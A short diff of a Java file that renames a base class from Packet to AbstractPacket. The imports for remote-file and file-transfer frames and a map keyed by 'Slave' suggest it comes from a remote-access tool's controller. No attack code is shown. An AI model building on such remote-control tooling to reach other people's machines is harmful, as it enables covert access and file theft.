@@ -14,7 +14,7 @@ import com.redpois0n.ui.frames.FrameFileTransfer;
 import com.redpois0n.ui.frames.FrameRemoteFiles;
 
 
-public class PacketFILE extends Packet {
+public class PacketFILE extends AbstractPacket {
 
 	public static final HashMap<Slave, FileData> data = new HashMap<Slave, FileData>();
 
